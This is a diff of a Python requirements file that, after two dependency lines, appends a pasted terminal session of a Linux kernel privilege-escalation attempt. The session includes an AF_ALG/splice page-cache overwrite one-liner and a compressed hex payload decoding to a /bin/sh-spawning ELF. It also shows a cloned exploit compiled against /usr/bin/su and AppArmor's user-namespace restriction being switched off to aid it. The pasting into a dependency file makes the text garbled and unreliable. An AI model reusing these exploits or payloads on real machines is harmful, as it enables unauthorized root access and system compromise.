@@ -1,2 +1,97 @@
 opencv-python>=4.8
 mediapipe>=0.10.14,<0.11; python_version < "3.13"
+root@VM-0-8-ubuntu:/home/nyxentra# uname -r
+Command 'uname' not found, did you mean:
+  command 'uuname' from deb uucp (1.07-28)
+  command 'uname' from deb coreutils (9.4-3ubuntu6.2)
+  command 'vuname' from deb umview (0.8.2-3.1)
+Try: apt install <deb name>
+root@VM-0-8-ubuntu:/home/nyxentra# nano 0.py
+root@VM-0-8-ubuntu:/home/nyxentra# python3 0.py
+Traceback (most recent call last):
+  File "/home/nyxentra/0.py", line 9, in <module>
+    while i<len(e):c(f,i,e[i:i+4]);i+=4
+                   ^^^^^^^^^^^^^^^
+  File "/home/nyxentra/0.py", line 5, in c
+    a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
+                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+FileNotFoundError: [Errno 2] No such file or directory
+root@VM-0-8-ubuntu:/home/nyxentra# # Extract the actual exploit payload
+python3 << 'EOF'
+import zlib
+payload = zlib.decompress(bytes.fromhex("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
+print("Payload length:", len(payload))
+print(payload[:100])
+print("\n--- String decode attempt ---")
+print(payload.decode('utf-8', errors='ignore'))
+EOF
+Payload length: 160
+b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00>\x00\x01\x00\x00\x00x\x00@\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x008\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x9e\x00\x00\x00'
+
+--- String decode attempt ---
+ELF>x@@@8@@11iH=1j;X1j<X/bin/sh
+root@VM-0-8-ubuntu:/home/nyxentra# uname -a
+Linux VM-0-8-ubuntu 6.8.0-101-generic #101-Ubuntu SMP PREEMPT_DYNAMIC Mon Feb  9 10:15:05 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
+root@VM-0-8-ubuntu:/home/nyxentra# exit
+exit: command not found
+root@VM-0-8-ubuntu:/home/nyxentra# ks
+Command 'ks' not found, but can be installed with:
+apt install qdl
+root@VM-0-8-ubuntu:/home/nyxentra# ls
+0.py
+root@VM-0-8-ubuntu:/home/nyxentra# exit
+exit
+nyxentra@VM-0-8-ubuntu:~$ git clone https://github.com/v12-security/pocs.git && cd pocs/fragnesia && gcc -o exp fragnesia.c && ./exp
+Cloning into 'pocs'...
+remote: Enumerating objects: 56, done.
+remote: Counting objects: 100% (31/31), done.
+remote: Compressing objects: 100% (24/24), done.
+remote: Total 56 (delta 11), reused 18 (delta 6), pack-reused 25 (from 2)
+Receiving objects: 100% (56/56), 41.65 MiB | 14.52 MiB/s, done.
+Resolving deltas: 100% (12/12), done.
+fragnesia.c: In function ‘main’:
+fragnesia.c:1300:9: warning: argument 2 null where non-null expected [-Wnonnull]
+ 1300 |         execve("/usr/bin/su", NULL, NULL);
+      |         ^~~~~~
+In file included from /usr/include/x86_64-linux-gnu/bits/sigstksz.h:24,
+                 from /usr/include/signal.h:328,
+                 from fragnesia.c:58:
+/usr/include/unistd.h:572:12: note: in a call to function ‘execve’ declared ‘nonnull’
+  572 | extern int execve (const char *__path, char *const __argv[],
+      |            ^~~~~~
+[*] uid=1003 euid=1003 gid=1003 egid=1003
+[*] mode=xfrm_espintcp_pagecache_replace collateral=after
+
+[*] target=/usr/bin/su size=55680
+outer_write_open_denied=1 errno=13 (Permission denied)
+userns_setup: outer_uid=1003 outer_gid=1003 ns_uid=0 ns_gid=0
+namespace_gate_failed: unshare(CLONE_NEWNET) errno=1 (Operation not permitted)
+nyxentra@VM-0-8-ubuntu:~/pocs/fragnesia$ sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0
+kernel.apparmor_restrict_unprivileged_userns = 0
+nyxentra@VM-0-8-ubuntu:~/pocs/fragnesia$ git clone https://github.com/v12-security/pocs.git && cd pocs/fragnesia && gcc -o exp fragnesia.c && ./exp
+Cloning into 'pocs'...
+remote: Enumerating objects: 56, done.
+remote: Counting objects: 100% (31/31), done.
+remote: Compressing objects: 100% (24/24), done.
+remote: Total 56 (delta 11), reused 18 (delta 6), pack-reused 25 (from 2)
+Receiving objects: 100% (56/56), 41.65 MiB | 10.27 MiB/s, done.
+Resolving deltas: 100% (12/12), done.
+fragnesia.c: In function ‘main’:
+fragnesia.c:1300:9: warning: argument 2 null where non-null expected [-Wnonnull]
+ 1300 |         execve("/usr/bin/su", NULL, NULL);
+      |         ^~~~~~
+In file included from /usr/include/x86_64-linux-gnu/bits/sigstksz.h:24,
+                 from /usr/include/signal.h:328,
+                 from fragnesia.c:58:
+/usr/include/unistd.h:572:12: note: in a call to function ‘execve’ declared ‘nonnull’
+  572 | extern int execve (const char *__path, char *const __argv[],
+      |            ^~~~~~
+[*] uid=1003 euid=1003 gid=1003 egid=1003
+[*] mode=xfrm_espintcp_pagecache_replace collateral=after
+
+[*] target=/usr/bin/su size=55680
+outer_write_open_denied=1 errno=13 (Permission denied)
+userns_setup: outer_uid=1003 outer_gid=1003 ns_uid=0 ns_gid=0
+netns_setup=1
+loopback_up=1
+namespace_gate_failed: XFRM_MSG_NEWSA ack errno=93 (Protocol not supported)
